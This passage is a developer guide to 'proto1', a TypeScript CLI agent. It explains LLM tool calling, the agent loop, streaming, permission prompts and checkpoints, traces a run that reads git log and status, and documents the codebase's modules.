# proto1: The Complete Guide

A full, end-to-end explanation of this codebase for a backend engineer who is new to AI agents.

- **Who this is for:** you know HTTP, databases, queues, async code, and TypeScript or Node. You don't yet know how LLMs, tool calling or agent loops work.
- **What you'll get:** the domain concepts first, then the architecture, then one real run traced line by line, then every file and class explained, then the cross-cutting concerns (cancellation, errors, persistence, security), and finally the known gaps and some exercises.
- **How to read it:** go through Part 1 (concepts) and Part 3 (the traced run) once, carefully. Use the rest as a reference while you read the code side by side.

Every file reference is a clickable link, like [loop.ts:78](src/runtime/loop.ts#L78).

---

## Table of contents

- [Part 1: The domain, from zero](#part-1-the-domain-from-zero)
- [Part 2: The architecture](#part-2-the-architecture)
- [Part 3: One real run, traced end to end](#part-3-one-real-run-traced-end-to-end)
- [Part 4: Every module, file and class](#part-4-every-module-file-and-class)
- [Part 5: Data flow in detail](#part-5-data-flow-in-detail)
- [Part 6: Cross-cutting concerns](#part-6-cross-cutting-concerns)
- [Part 7: TypeScript features this code relies on](#part-7-typescript-features-this-code-relies-on)
- [Part 8: Configuration, commands and exit codes](#part-8-configuration-commands-and-exit-codes)
- [Part 9: Known gaps and bugs](#part-9-known-gaps-and-bugs)
- [Part 10: Exercises to lock in your understanding](#part-10-exercises-to-lock-in-your-understanding)
- [Glossary](#glossary)

---

# Part 1: The domain, from zero

Before the code makes sense, you need seven ideas. Each one is explained with a backend analogy.

## 1.1 An LLM is a stateless HTTP function

A large language model (LLM) API is, from your point of view, **one stateless endpoint**:

```
POST /chat
body:  { model, system, messages[], tools[] }
reply: the model's next message
```

The most important word is **stateless**. The server remembers nothing between calls. If you want the model to "remember" that it read a file two steps ago, **you** must send the whole conversation again, every time. It's like a REST API with no session: the client resends the full context on each request.

So the conversation array (`messages`) is the agent's *entire* memory. That's why this project saves `messages` to disk (checkpoints) and why it gets expensive as runs get longer: every call resends everything that came before.

## 1.2 Messages, roles and the system prompt

A conversation is an ordered list of messages. Each has a **role**:

| Role | Who writes it | Example |
| --- | --- | --- |
| `system` | You (the developer) | "You are a senior engineer. Never guess…" |
| `user` | The human, **or your program** returning tool results | "count the TODOs in this repo" |
| `assistant` | The model | "I'll search for TODO comments first." |

The **system prompt** is a set of standing instructions that sits above the conversation. In this project it's built from `agents/general.toml` plus the list of skills ([loop.ts:177](src/runtime/loop.ts#L177)).

A message's `content` is either a plain string or an array of **content blocks**. Blocks let one message carry several things at once, for example some text *and* two tool calls. In this codebase, blocks are defined in [providers/index.ts:3](src/providers/index.ts#L3):

```ts
type IContentBlock =
  | { type: "text"; text: string }
  | { type: "tool_use"; id: string; name: string; input: unknown }        // model → you
  | { type: "tool_result"; toolUseId: string; content: string; isError?: boolean } // you → model
```

## 1.3 Tokens, context window and cost

Models don't read characters, they read **tokens** (roughly ¾ of a word each). Three consequences:

1. **Cost is per token.** You pay for input tokens (everything you send, *including the resent history*) and output tokens (what the model writes). Output is usually several times more expensive per token.
2. **The context window is a hard limit** on input + output tokens per call (for example 200k). Exceed it and the call fails.
3. **Big tool outputs are dangerous.** If a tool returns 700 KB, that text is resent on every later call. That's why every tool here truncates its output (`MAX_OUTPUT_BYTES`, 30 KB by default).

`max_tokens: 4096` in the providers caps how much the model may write in one reply.

## 1.4 Tool calling (a.k.a. function calling)

The model cannot run code. What it *can* do is reply with a structured request: "please call `shell_exec` with `{command: "git", args: ["status"]}`".

The flow:

1. In each request you send a list of **tool definitions**: name, description, and a JSON Schema describing the arguments.
2. The model decides to use one and replies with a `tool_use` block containing an `id`, the `name`, and the `input` JSON.
3. **Your code** looks up the tool by name, validates the input, runs it, and sends back a `tool_result` block with the **same id**.
4. You call the model again. It now sees the result and decides what to do next.

Backend analogy: tools are **RPC endpoints**, the JSON Schema is their **OpenAPI request spec**, and the model is a **client** that reads your API docs and makes calls. Like any untrusted client, its requests must be validated (that's what Zod does here).

The model only ever sees the **name, description and schema**. Those strings are effectively prompt engineering: a vague description means the tool gets misused. Fixing that means editing the description, not the handler.

## 1.5 The agent loop

An **agent** is just a loop around tool calling:

```
messages = [user task]
loop:
    reply = model(system, messages, tools)
    messages += reply
    if reply has no tool calls: done (the reply text is the answer)
    results = run every tool call in reply
    messages += one user message containing all results
```

That is the whole idea. Everything else in this codebase (permissions, budgets, streaming, checkpoints, cancellation) is attached to one of those steps. The loop lives in [runtime/loop.ts](src/runtime/loop.ts) and is the heart of the project.

Backend analogy: it's a **worker that keeps re-enqueuing itself**. Each iteration = one call to the model plus the side effects it asked for. The iteration count and cost limits are the equivalent of a retry limit / circuit breaker so it can't run forever.

## 1.6 Streaming (SSE)

Model replies can take seconds. Instead of waiting for the whole reply, providers can **stream** it using Server-Sent Events: many small chunks over one HTTP response. Text arrives word by word, so you can print it as it comes.

The catch: **tool call arguments arrive as fragments of JSON text**:

```
chunk 1: {"comm
chunk 2: and":"git","ar
chunk 3: gs":["status"]}
```

You must concatenate the fragments and only `JSON.parse` when the block is complete. Both provider adapters do exactly this (an "accumulator").

In TypeScript, a stream you consume with `for await` is modelled as an **async generator** (`async function*`). This codebase uses async generators at three levels (provider → loop → CLI). See [Part 7](#part-7-typescript-features-this-code-relies-on) if they're new to you.

## 1.7 Stop reasons

Every reply ends with a reason:

| Reason | Meaning |
| --- | --- |
| `end_turn` | The model thinks it's finished |
| `tool_use` | The model wants tools run |
| `max_tokens` | It hit the output limit mid-reply |

This codebase normalizes these into `TStopReason` ([providers/index.ts:8](src/providers/index.ts#L8)). Note: the loop deliberately **does not** trust the stop reason to decide whether to continue. It looks at whether there were tool calls ([loop.ts:135-137](src/runtime/loop.ts#L135-L137)), because some models return "stop" together with tool calls.

## 1.8 Skills and progressive disclosure

A **skill** is a chunk of expert instructions (for example "how to do a code review in this repo") stored in a file. Putting every skill's full text in the system prompt would waste tokens on every call. So:

1. The system prompt contains only each skill's **name + one-line description** (cheap).
2. A tool, `open_skill`, returns the full instructions when the model decides it needs them.

This is called **progressive disclosure**. Backend analogy: lazy loading, or an index page with links instead of inlining every document.

## 1.9 Providers and why there are adapters

Different vendors have different wire formats for the same concepts:

| Concept | Anthropic format | OpenAI / OpenRouter format |
| --- | --- | --- |
| System prompt | top-level `system` field | a message with `role: "system"` |
| Tool call | `tool_use` content block inside assistant message | `tool_calls` array on assistant message |
| Tool result | `tool_result` block inside a **user** message | separate message with `role: "tool"` |
| Tool schema | `input_schema` | `function.parameters` |
| Stream events | `content_block_start/delta/stop`, `message_delta`… | `choices[0].delta` chunks |

**OpenRouter** is a gateway: one API key, one OpenAI-style API, many models from many vendors (including free ones). The CLI currently always uses it.

This project defines **its own internal format** (which happens to look like Anthropic's) and writes one **adapter** per vendor that translates in both directions. That's the Ports-and-Adapters (hexagonal) pattern, covered in [2.3](#23-design-patterns-mapped-to-backend-concepts).

---

# Part 2: The architecture

## 2.1 What the program does

You run it from a terminal with a task in plain English:

```bash
bun run dev "give me the last git log and its description and status"
```

It loads an agent definition, discovers skills, registers six tools, then runs the agent loop against a model on OpenRouter. The model's text streams to your terminal. When the model wants to write a file or run a command, you're asked `Allow? [y/N]`. Every event is appended to a log file, and the conversation is checkpointed to disk after every step so it can be resumed.

## 2.2 Layer diagram

```
                           ┌──────────────────────────────────────────────┐
  terminal args, .env ───▶ │ CLI  src/cli/index.ts                         │
                           │  • composition root: builds & wires objects   │
                           │  • renderer: prints events                    │
                           │  • SIGINT → AbortController                   │
                           └───────────────┬──────────────────────────────┘
                                           │ for await (event of loop.run(signal))
                           ┌───────────────▼──────────────────────────────┐
                           │ RUNTIME  src/runtime/                         │
                           │  AgentLoop  ◀── AgentExecution (the "job")    │
                           │     │            ├─ AgentDefination (toml)    │
                           │     │            ├─ TAgentConfig              │
                           │     │            └─ ToolSet                   │
                           │     ├─ repairHistory (history.ts)             │
                           │     └─ ExecutionMemory (checkpoints)          │
                           └──┬──────────┬─────────────┬─────────────┬────┘
                              │          │             │             │
                ┌─────────────▼──┐ ┌─────▼───────┐ ┌───▼─────────┐ ┌─▼──────────┐
                │ PROVIDERS      │ │ TOOLS       │ │ PERMISSIONS │ │ UTILS      │
                │ Provider iface │ │ ToolCatalog │ │ Policy      │ │ Logger     │
                │ OpenRouter     │ │ ToolSet     │ │ CliPrompter │ │ (JSONL)    │
                │ Anthropic      │ │ fs_*, shell │ └─────────────┘ └────────────┘
                └───────┬────────┘ │ open_skill ─┼──┐
                        │          └─────────────┘  │
                        ▼                           ▼
                  model vendor API         ┌────────────────────┐
                  (HTTPS + SSE)            │ CONFIGS            │
                                           │ Loader (env)       │
                                           │ SkillLoader, parse │
                                           └────────────────────┘

   DOMAINS  src/domains/  (tool types, error classes)  ← imported by everyone, imports nothing
```

Rules the layering follows (mostly):

- **`domains`** has no I/O and no dependencies. It's the vocabulary.
- **`runtime`** depends on *interfaces* (`Provider`, `IPermissionPolicy`, `IExecutionMemory`, `IRunLogger`), not concrete classes. It never imports `OpenRouterProvider` or `Logger` directly.
- **`cli`** is the only place that knows every concrete class. It creates them and injects them. This is the **composition root**.

## 2.3 Design patterns mapped to backend concepts

| Pattern here | Where | Backend equivalent you already know |
| --- | --- | --- |
| Ports & Adapters | `Provider` interface + `OpenRouterProvider` / `AnthropicProvider` | A payment interface with Stripe and PayPal implementations |
| Dependency injection (manual) | `AgentLoop` constructor takes 7 dependencies | Constructor injection in NestJS/Spring, without the container |
| Composition root | `CliAgent.run()` | `main()` / `app.module.ts` where everything is wired |
| Registry | `ToolCatalog`, `SkillLoader.skills` | A handler/route registry keyed by name |
| Strategy | `PermissionPolicy` modes | Pluggable auth strategies |
| Command dispatch | `executeTool(name, input)` | A message bus dispatching commands to handlers |
| Request validation | Zod `schema.safeParse` | Joi/Zod/class-validator on an HTTP body |
| Middleware chain | lookup → validate → permission → handler → catch | Express middleware: 404 → 400 → 403 → controller → error handler |
| Append-only log | `Logger` → `logs/<id>.jsonl` | An audit log / event stream |
| Snapshot persistence | `ExecutionMemory` → `memory/<id>.json` | A job-state snapshot written after each step |
| Atomic write | temp file + `rename()` | Write-then-swap; same idea as a DB committing a page |
| Streaming pipeline | async generators across 3 layers | A Node stream / RxJS pipe / Kafka consumer chain |
| Cooperative cancellation | one `AbortSignal` passed everywhere | Go's `context.Context`, or a request-scoped cancellation token |

## 2.4 Folder and file map

| Path | Kind | Responsibility |
| --- | --- | --- |
| [src/cli/index.ts](src/cli/index.ts) | entry point | Parse args, wire all objects, handle Ctrl-C, render events, set exit code |
| [src/configs/loadConfig.ts](src/configs/loadConfig.ts) | config | Build `TAgentConfig` from env vars + agent file |
| [src/configs/skill.ts](src/configs/skill.ts) | types | Skill types and `ISkillLoader` interface |
| [src/configs/formatter.ts](src/configs/formatter.ts) | parser | Parse and validate one `SKILL.toml` |
| [src/configs/skillLoader.ts](src/configs/skillLoader.ts) | loader | Discover all skills in `skills/`, look them up by name |
| [src/domains/tool.ts](src/domains/tool.ts) | types | The tool contract: definition, context, call, result, effect |
| [src/domains/error.ts](src/domains/error.ts) | errors | `EcoError` with a `code`, and subclasses |
| [src/runtime/index.ts](src/runtime/index.ts) | types | Agent, execution, event, checkpoint and memory types |
| [src/runtime/agent.ts](src/runtime/agent.ts) | loader | Load `agents/general.toml` |
| [src/runtime/execution.ts](src/runtime/execution.ts) | data | One "job": id + task + config + tools + skills + agent |
| [src/runtime/loop.ts](src/runtime/loop.ts) | **core** | The agent loop |
| [src/runtime/history.ts](src/runtime/history.ts) | pure function | Repair a saved conversation before resuming |
| [src/runtime/executionMemory.ts](src/runtime/executionMemory.ts) | persistence | Save/load checkpoints atomically |
| [src/providers/index.ts](src/providers/index.ts) | types | The internal, vendor-neutral model API |
| [src/providers/openrouter.ts](src/providers/openrouter.ts) | adapter | Internal format ⇄ OpenRouter (OpenAI-style) |
| [src/providers/anthropic.ts](src/providers/anthropic.ts) | adapter | Internal format ⇄ Anthropic Messages API (not wired into the CLI) |
| [src/tools/catalog.ts](src/tools/catalog.ts) | registry | All registered tools; builds a `ToolSet` |
| [src/tools/toolSet.ts](src/tools/toolSet.ts) | collection | The tools one execution may use; Zod → JSON Schema |
| [src/tools/fs.ts](src/tools/fs.ts) | tools | `fs_read`, `fs_glob`, `fs_write`, `fs_mkdir` + `FileResolver` |
| [src/tools/shell.ts](src/tools/shell.ts) | tool | `shell_exec` |
| [src/tools/skill.ts](src/tools/skill.ts) | tool | `open_skill` |
| [src/permissions/index.ts](src/permissions/index.ts) | types | Modes, decisions, policy and prompter interfaces |
| [src/permissions/policy.ts](src/permissions/policy.ts) | logic | Decide allow / ask / deny |
| [src/permissions/cliPrompter.ts](src/permissions/cliPrompter.ts) | UI | Ask `Allow? [y/N]` in the terminal |
| [src/utils/index.ts](src/utils/index.ts) | types | `IRunLogger` interface |
| [src/utils/logger.ts](src/utils/logger.ts) | I/O | Append JSON lines to `logs/<runId>.jsonl` |
| [agents/general.toml](agents/general.toml) | data | The agent: name, model, instructions |
| [skills/*/SKILL.toml](skills/) | data | Skills: name, description, instructions |
| `logs/` | runtime output | One JSONL file per run (git-ignored) |
| `memory/` | runtime output | One checkpoint JSON per execution (git-ignored) |
| [README.md](README.md) | doc | The original build guide ("The Pond") |
| [FIXES.md](FIXES.md) | doc | What was broken and how it was fixed |

---

# Part 3: One real run, traced end to end

This is a real run from your `logs/` and `memory/` folders (execution `74115231…`, 29 Sep 2026). Task:

```bash
bun run dev "give me the last git log and it's description and status"
```

Result: `completed`, 2 iterations, 3,293 input + 761 output tokens.

Follow it step by step with the code open.

## Step 0: Process start and module loading

`bun run dev` runs the `dev` script from [package.json](package.json): `tsx src/cli/index.ts`. `tsx` is Node with on-the-fly TypeScript compilation.

Node loads `src/cli/index.ts`. Because this is an ES module, **every imported module is evaluated first**, top to bottom, before any line of `index.ts` runs. Then `config({ path: ".env" })` ([cli/index.ts:19](src/cli/index.ts#L19)) loads `.env` into `process.env`. (This ordering causes a real bug, see [Part 9](#part-9-known-gaps-and-bugs).)

Then `new CliAgent().run()` ([cli/index.ts:130](src/cli/index.ts#L130)).

## Step 1: Bootstrap and wiring (the composition root)

Inside [CliAgent.run()](src/cli/index.ts#L34):

1. **Parse args.** No `--resume`, so `task` = all args joined; `executionId` stays `undefined`.
2. **Skills.** `new SkillLoader("<cwd>/skills")`, then `discover()` reads every `skills/<dir>/SKILL.toml`, parses and validates it, and stores it in a `Map` by name. `formatAvailableSkills()` produces:
   ```
   - code-review: Conventions and checklist for reviewing TypeScript code in this repository.
   - scientific-review: Conventions and checklist for reviewing scientific research code and ensuring data integrity.
   ```
3. **Tools.** Six tool objects are registered in a `ToolCatalog`, then `createToolSet([...6 names])` builds the `ToolSet` this execution may use.
4. **Logger.** `new Logger("<cwd>/logs", randomUUID())`. Each *run* gets a new log file, even when resuming.
5. **Memory.** `new ExecutionMemory("<cwd>/memory")`.
6. **Agent.** `new AgentDefination("<cwd>/agents").load()` parses `agents/general.toml`.
7. **Config.** `loader.agentConfig(agent)` merges env vars and the agent file into a `TAgentConfig`. It prints: `model: … (from MODEL in .env) · permissions: standard`.
8. **Execution.** `new AgentExecution(randomUUID(), task, config, toolset, availableSkills, agent)`. This is the "job" object.
9. **Provider, policy, prompter.** `new OpenRouterProvider()` (throws immediately if `OPENROUTER_API_KEY` is missing), `new PermissionPolicy("standard")`, `new CliPermissionPrompter()`.
10. **Loop.** `new AgentLoop(provider, execution, { workspaceRoot: cwd }, policy, prompter, memory, logger)`.
11. **Cancellation.** An `AbortController` is created and a `SIGINT` handler is installed: first Ctrl-C calls `abort()`, second one force-exits with 130.
12. **Consume.** `for await (const event of agentloop.run(abort.signal))` starts pulling events.

## Step 2: `run()` starts

[AgentLoop.run()](src/runtime/loop.ts#L78):

1. `logger.start(task)` writes the first log line:
   ```json
   {"type":"run_started","runId":"55080c84-…","task":"give me the last git log…","timestamp":"…09:37:07.206Z"}
   ```
2. `loadMemoryCheckpoint()` tries `memory/<executionId>.json`. It's a new id, so there's no file (`ENOENT` → `null`). The task is pushed:
   ```
   messages = [ { role: "user", content: "give me the last git log and it's description and status" } ]
   ```
3. `buildSystemPrompt()` joins the agent instructions, a `[AVAILABLE SKILLS]` header, a usage hint and the skill list.
4. `execution.tools.modelTools()` converts every tool's Zod schema into plain JSON Schema. For example `shell_exec` becomes:
   ```json
   {
     "name": "shell_exec",
     "description": "Run a program (without a shell) from the workspace root, …",
     "inputSchema": {
       "type": "object",
       "properties": {
         "command": { "type": "string", "minLength": 1, "description": "The program to run, on its own. …" },
         "args":    { "type": "array", "items": { "type": "string" }, "default": [], "description": "…" }
       },
       "required": ["command"]
     }
   }
   ```
   Note that `args` isn't required, because it has a `.default([])` and the conversion uses `io: "input"`.

## Step 3: Iteration 1, the model call

Guards pass (not aborted, `0 < maxIterations`, `$0 < maxCostUsd`), so `iterations` becomes 1.

The loop calls `provider.complete({ model, system, messages, tools, signal })`. In [OpenRouterProvider.complete()](src/providers/openrouter.ts#L13):

- `mapTools()` wraps each tool as `{ type: "function", function: { name, description, parameters } }`.
- `mapMessages()` puts the system prompt first as `{ role: "system" }`, then maps each internal message.
- `client.chat.send({ chatRequest: { model, messages, tools, maxTokens: 4096, stream: true } }, { signal })` opens the SSE stream. (The SDK takes camelCase and sends snake_case on the wire: `max_tokens`, `tool_calls`, `tool_call_id`.)

Chunks arrive. Each has `choices[0].delta`:

- `delta.content` = `"I'll get the last git log"` → yields `{ type: "text", delta }` right away.
- `delta.toolCalls` = fragments. `accumulateToolCall()` groups them **by `index`** in a `Map` and concatenates `arguments`.
- The last chunk carries `usage` → yields `{ type: "usage", inputTokens, outputTokens, costUsd }`.
- `finishReason: "tool_calls"` → remembered as `tool_use`.

After the stream ends, the adapter parses each accumulated `arguments` string and yields one `tool_use` event per call, then a `stop` event.

Back in the loop's `switch` ([loop.ts:102-128](src/runtime/loop.ts#L102-L128)):

- `text` → appended to `delta` **and** yielded to the CLI, which prints it immediately with `process.stdout.write`.
- `tool_use` → pending text is flushed into `agentContent` as a text block, then the `tool_use` block is appended; the call is added to `toolCalls`, logged, and a `tool_start` event is yielded (the CLI prints `[tool] shell_exec`).
- `usage` → `addUsage()` sums tokens and cost.
- `stop` → ignored on purpose.

This model asked for **two** tools in one reply (parallel tool calls). That's why the log shows two `tool_start` lines 5 ms apart.

After the stream: the assistant message is pushed and a checkpoint is saved with status `running`:

```
messages = [
  { role: "user", content: "give me the last git log…" },
  { role: "assistant", content: [
      { type: "text", text: "I'll get the last git log and status for you." },
      { type: "tool_use", id: "call_0a01…", name: "shell_exec", input: { command: "git", args: ["log","-1","--format=%H %s"] } },
      { type: "tool_use", id: "call_3728…", name: "shell_exec", input: { command: "git", args: ["status"] } }
  ]}
]
```

`toolCalls.length === 2`, so it doesn't stop. It runs `yield* this.runTools(toolCalls, signal)`.

## Step 4: Iteration 1, running the tools

[runTools()](src/runtime/loop.ts#L159) handles calls **one at a time, in order**. For each, [executeTool()](src/runtime/loop.ts#L49) runs this pipeline:

```
 tool_use {name, input}
      │
      ▼
 1. lookup     tools.get(name)            → missing?  "Unknown tool X. Available tools: …"
      │
      ▼
 2. validate   tool.schema.safeParse()    → invalid?  "Invalid input for X: <zod error>"
      │         (args defaults to [] here)
      ▼
 3. policy     policy.check(tool)         → "deny"?  "X is not allowed in the current permission mode."
      │         shell_exec effect = "exec"
      │         standard + exec → "ask"
      ▼
 4. prompt     prompter.confirm()         → "n"?     "The user denied this action."
      │         shows tool + parsed args
      ▼
 5. handler    tool.handler(data, ctx)    → throws?  converted to { ok:false, error }
      │
      ▼
 IToolResult { ok, content, error? }
```

The terminal showed:

```
Permission required for 'shell_exec' with:
{
  "command": "git",
  "args": ["log", "-1", "--format=%H %s"]
}
Allow? [y/N] y
```

`ShellExec.handler` ran `spawn("git", [...], { shell: false, cwd: workspaceRoot, detached: true })`, collected stdout/stderr, and on `close` returned:

```json
{ "ok": true, "content": "$ git log -1 --format=%H %s\n\n(exit code 0)\n\nSTDOUT:\n4b7a690… working, follow md and done" }
```

For each result, `runTools()`:

1. logs it and yields `tool_result` (the CLI prints `[tool result] success`),
2. converts it with `toToolResultBlock()` into `{ type: "tool_result", toolUseId: "call_0a01…", content, isError: false }`,
3. on the **first** result, pushes **one** user message whose `content` is the `results` array. Later results are pushed into the *same array*, so that message grows in place,
4. saves a checkpoint.

After both tools:

```
messages = [
  user(task),
  assistant(text + 2 × tool_use),
  { role: "user", content: [
      { type: "tool_result", toolUseId: "call_0a01…", content: "$ git log …", isError: false },
      { type: "tool_result", toolUseId: "call_3728…", content: "$ git status …", isError: false }
  ]}
]
```

This is the shape the APIs require: every `tool_use` id answered, all answers in **one** user message, in the same order.

## Step 5: Iteration 2, the final answer

Back to the top of the `while`. Guards pass, `iterations` becomes 2. The whole `messages` array is sent again. For OpenRouter, `mapMessage()` turns it into:

```json
[
  { "role": "system", "content": "You are an expert senior software engineer…" },
  { "role": "user", "content": "give me the last git log…" },
  { "role": "assistant", "content": "I'll get the last git log and status for you.",
    "tool_calls": [
      { "id": "call_0a01…", "type": "function", "function": { "name": "shell_exec", "arguments": "{\"command\":\"git\",…}" } },
      { "id": "call_3728…", "type": "function", "function": { "name": "shell_exec", "arguments": "{\"command\":\"git\",\"args\":[\"status\"]}" } }
    ] },
  { "role": "tool", "tool_call_id": "call_0a01…", "content": "$ git log …" },
  { "role": "tool", "tool_call_id": "call_3728…", "content": "$ git status …" }
]
```

See how one internal user message with two `tool_result` blocks became **two** `role: "tool"` messages. That's the adapter's job.

The model streams a Markdown answer ("Here's the latest git log and repository status: …") with **no** tool calls. The loop pushes the assistant message, checkpoints, sees `toolCalls.length === 0`, sets `outcome = "completed"` and breaks.

## Step 6: Finishing

- `finish("completed", "completed")` saves the final checkpoint with `status: "completed"` and writes the last log line:
  ```json
  {"type":"run_finished","runId":"55080c84-…","outcome":"completed","iterations":2,"usage":{"inputTokens":3293,"outputTokens":761,"costUsd":0}}
  ```
  (`costUsd: 0` most likely because the model was a free one, so OpenRouter reported zero cost. With a free model, `maxCostUsd` can never trigger.)
- The loop yields `{ type: "done", outcome, iterations, usage }`.
- The CLI prints `[completed] 2 iterations · 4054 tokens · $0.0000 · execution 74115231-…` and sets `process.exitCode = 0`.
- The generator ends, the `for await` ends, the `finally` removes the SIGINT handler, and `🤖 agent done 🤖` prints.

## Step 7: What's left on disk

- `logs/55080c84-….jsonl`: 6 lines (start, 2 × tool_start, 2 × tool_result, finished). Note: text deltas are **not** logged.
- `memory/74115231-….json`: the checkpoint, including the full `messages` array. You could continue this conversation with:
  ```bash
  bun run dev --resume 74115231-8b80-43ce-9dd3-689f5e59e2a8 "now show the last 3 commits"
  ```

The log file id (`55080c84…`) and execution id (`74115231…`) differ. The run id identifies one process run; the execution id identifies the conversation, which can span several runs through `--resume`.

---

# Part 4: Every module, file and class

For each file: **what** it is, **why** it exists, **how** it works, and **gotchas**.

## 4.1 `domains/`: the vocabulary

### [domains/tool.ts](src/domains/tool.ts)

The contract every tool must satisfy. It's the most important type file after the provider types.

```ts
type TToolEffect = "read" | "write" | "exec" | "meta";
```

An **effect** classifies what a tool *can do*. The permission policy decides based on the effect, not the tool's name. That's what lets you add a new tool without touching permissions: just declare its effect.

| Effect | Meaning | Tools |
| --- | --- | --- |
| `read` | Only observes the workspace | `fs_read`, `fs_glob` |
| `write` | Changes files | `fs_write`, `fs_mkdir` |
| `exec` | Runs arbitrary programs | `shell_exec` |
| `meta` | Affects the agent itself, not the world | `open_skill` |

```ts
interface IToolContext { workspaceRoot: string; signal: AbortSignal }
```

What a handler gets besides its input: where the workspace is, and a signal that fires on Ctrl-C. The loop holds `Omit<IToolContext, "signal">` and adds the signal per call ([loop.ts:70](src/runtime/loop.ts#L70)).

```ts
interface IToolResult { ok: boolean; content: string; error?: string }
```

What a handler returns. **`content` is exactly what the model will see.** Rule: handlers **return** errors (`ok: false`), they don't throw. The model reads the error and adapts, like a client reading a 4xx body.

```ts
interface IToolDefinition<I = unknown> {
  name; description; schema: z.ZodType<I>; effect;
  handler(input: I, context: IToolContext): Promise<IToolResult>;
}
```

Generic over `I`, the validated input type. `schema` both validates and, after conversion, becomes the JSON Schema the model sees. One source of truth for the runtime check, the static type (`z.infer`) and the documentation for the model.

`TResolvedPathResult` is a small **Result type** (`{ok:true, path} | {ok:false, error}`) used by the path jail.

### [domains/error.ts](src/domains/error.ts)

`EcoError extends Error` adds a machine-readable `code`. `ConfigError` (`CONFIG_ERROR`) is thrown by the config loader; `EcoError("CHECKPOINT_CORRUPT")` by the checkpoint loader. `CliError` is defined but not used yet. Backend analogy: typed application errors with error codes, like an `AppError` with an HTTP-mappable code.

## 4.2 `configs/`: turning files and env vars into objects

### [configs/loadConfig.ts](src/configs/loadConfig.ts): `Loader`

Produces the run's settings:

```ts
type TAgentConfig = {
  model; modelSource; maxIterations; maxCostUsd; permissionMode;
  inputUsdPerMTok; outputUsdPerMTok;
}
```

`agentConfig(agent)`:

- **Model precedence:** `MODEL` env var wins, else the agent file's `model`. If neither, it throws `ConfigError`. `modelSource` records which one won so the CLI can print it (avoids "why is it using that model?").
- **permissionMode:** from env `permissionMode`, default `standard`, validated with a **type guard** `isPermissionMode(value): value is TPermissionMode`. A typo is an error instead of silently becoming an invalid mode.
- **Limits:** `maxIterations` (default 10), `maxCostUsd` (default 1).
- **Prices:** `inputUsdPerMTok` / `outputUsdPerMTok` (USD per million tokens), default 0. Only used when the provider doesn't report cost itself.

Gotcha: `Number(x) || default` means `0` can't be configured (it falls back to the default). And env var names are camelCase (`maxIterations`), unlike the usual `MAX_ITERATIONS` convention.

`PERMISSION_MODES` uses `satisfies TPermissionMode[]`: the compiler checks each string is a valid mode while the variable keeps the wider `readonly string[]` type (so `.includes(value: string)` compiles).

### [configs/skill.ts](src/configs/skill.ts)

Types only:

- `ISkillMeta { name, description, path }`: the cheap part that goes in the system prompt.
- `ISkill { meta, instructions }`: the full skill.
- `ISkillToml`: the raw parsed TOML, with every field `unknown` because file contents are untrusted until validated. Good habit: never type external data as already-valid.
- `ISkillLoader`: the interface `OpenSkill` depends on (so the tool doesn't depend on the concrete loader).
- `ISkillFrontMatter`: leftover from the markdown-frontmatter design, unused.

### [configs/formatter.ts](src/configs/formatter.ts): `parseSkillToml(source, path)`

Despite the file name, it's a **parser + validator**. It parses TOML with `smol-toml`, checks `name`, `description` and `instructions` are non-empty strings (clear error per field), trims them, and returns an `ISkill`. A hand-written equivalent of a Zod schema.

### [configs/skillLoader.ts](src/configs/skillLoader.ts): `SkillLoader`

- `discover()`: clears the map, lists `skills/`, and for each **directory** reads `SKILL.toml`, parses it, and checks that the directory name equals the skill's `name` (so the model's `open_skill("code-review")` always maps to `skills/code-review/`). Stores it in `skills: Map<name, ISkill>`.
- `open(name)`: returns the skill or throws `Skill not found`.
- `list()`: all skills.
- `formatAvailableSkills(skills)`: renders `- name: description` lines for the system prompt.

Gotchas: a directory without `SKILL.toml`, or a missing `skills/` folder, throws and crashes startup. Discovery is sequential (`await` in a `for`), which is fine for a handful of files.

## 4.3 `runtime/`: the core

### [runtime/index.ts](src/runtime/index.ts): the runtime's types

- `TRunOutcome = "completed" | "max_iterations" | "budget_exceeded" | "cancelled"`: why a run stopped normally. A crash is not an outcome; it's a thrown error.
- `IRunUsage { inputTokens, outputTokens, costUsd }`.
- `TAgentEvent`: what the loop streams to its caller:

  | Event | When | CLI prints |
  | --- | --- | --- |
  | `text` | Each text fragment from the model | the fragment, inline |
  | `tool_start` | The model requested a tool | `[tool] shell_exec` |
  | `tool_result` | A tool finished (or was refused) | `[tool result] success` or the error |
  | `done` | End of run | the summary line |

- `IAgentDefinition { name, model, description, instructions }`.
- `IAgentExecution`: read-only view of an execution.
- `TExecutionStatus = "running" | "paused" | "completed" | "failed" | "cancelled"`: what's written into checkpoints.
- `IExecutionCheckpoint { executionId, agent, task, iteration, status, messages, updatedAt }`.
- `IExecutionMemory { save, load }`: the persistence port.

### [runtime/agent.ts](src/runtime/agent.ts): `AgentDefination`

Reads `<root>/general.toml` and copies the four fields onto itself. The `!` in `name!: string` is a **definite assignment assertion**: "trust me, this gets set before use" (it's set in `load()`, not the constructor). So you must call `load()` before reading fields.

Gotchas: the file name `general.toml` is hardcoded, so there's no way to choose another agent yet. The parsed TOML is cast (`as unknown as IAgentDefinition`) without validation, unlike skills. (Also, "Defination" is a typo for "Definition".)

### [runtime/execution.ts](src/runtime/execution.ts): `AgentExecution`

A plain data holder: **one job**. It bundles `id`, `task`, `config`, `tools`, `availableSkills` and `agent`. Backend analogy: a job record in a queue with its payload and settings. It's the thing that later could be scheduled, resumed, or run by several agents.

### [runtime/loop.ts](src/runtime/loop.ts): `AgentLoop`, the heart

**State (fields):**

| Field | Purpose |
| --- | --- |
| `provider` | Talks to the model |
| `execution` | Task, config, tools, agent |
| `toolContext` | `{ workspaceRoot }` passed to handlers |
| `permissionPolicy`, `permissionPrompter` | The permission gate |
| `messages` | **The conversation: the agent's only state** |
| `memory` | Checkpoint store |
| `logger` | Run log |
| `usage` | Running token and cost totals |
| `iterations` | Model calls made in this run |

**`STATUS_FOR_OUTCOME`** ([loop.ts:10](src/runtime/loop.ts#L10)) maps how a run ended to what status the checkpoint gets. Hitting a limit maps to `paused` (you can resume), not `failed`.

**`run(signal)`**, an `async *` generator:

```
logger.start
loadMemoryCheckpoint            (history + new task)
system = buildSystemPrompt()    (once per run)
tools  = toolSet.modelTools()   (once per run)
try:
  while true:
    aborted?            → cancelled
    iterations ≥ max?   → max_iterations
    costUsd ≥ max?      → budget_exceeded
    iterations++
    stream provider.complete(...)  → yield text / tool_start, collect toolCalls, sum usage
    push assistant message; checkpoint("running")
    no tool calls?      → completed
    yield* runTools(...)
catch:
  aborted? → cancelled
  else     → finish("failed"); rethrow
finish(status, outcome)
yield done
```

Details worth understanding:

